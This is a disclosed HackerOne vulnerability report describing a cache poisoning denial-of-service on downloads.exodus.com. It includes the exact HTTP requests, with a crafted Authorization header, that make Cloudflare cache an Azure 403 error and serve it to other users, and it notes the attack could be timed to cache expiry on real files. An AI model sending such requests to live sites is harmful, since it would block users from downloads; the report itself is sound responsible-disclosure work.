# Cache Poisoning DoS on downloads.exodus.com

## Report Details
- **Report ID**: 1173153
- **URL**: https://hackerone.com/reports/1173153
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-04-23T11:38:15.900Z
- **Disclosed**: 2021-12-22T23:36:50.416Z

## Reporter
- **Username**: youstin
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: exodus

## Vulnerability Information
## Summary:
Hello,

The subdomain downloads.exodus.com hosts all files meant to be downloaded by exodus users. A few of the file I found are:

```
https://downloads.exodus.com/releases/exodus-linux-x64-21.4.9.zip
https://downloads.exodus.com/releases/hashes-exodus-21.2.12.txt
https://downloads.exodus.com/releases/exodus-macos-21.3.29.dmg
```

The files are hosted on a azure storage host and are cached by Cloudflare.
A crafted Authorization header causes a 403 on the azure storage host, which is cached by cloudflare and passed to all other users accessing the source. 

### Disclaimer:
No actual denial of service attack was caused troughout my testing. All the testing used cache-busters, meaning it did not affect the live website in any way.

## Steps To Reproduce:

1. Send the following request to poison the cache:
```http
GET /releases/hashes-exodus-21.2.12.txt?cachebuster=hackerone HTTP/1.1
Host: downloads.exodus.com
Authorization: SharedKeyLite myaccount:ctzMq410TV3wS7upTBcunJTDLEJwMAZuFPfr0mrrA08=  

```
Notice you will get a 403. 

2. The cache is now poisoned so sending a request without the header or visiting the poisoned url in a browser will show you the cached 403. 
```
```http
GET /releases/hashes-exodus-21.2.12.txt?cachebuster=hackerone HTTP/1.1
Host: downloads.exodus.com

```
Will show the same 403 response. 

## Supporting Material/References:

Video PoC:

████████

## Impact

The steps that were used to take down a reosurce including a random parameter as a cache-buster can also be reproduced on the actual files when their cache is about to expire.  This will cause a DoS, restricting users from downloading or accessing the files hosted on downloads.exodus.com.

## Attachments
No attachments
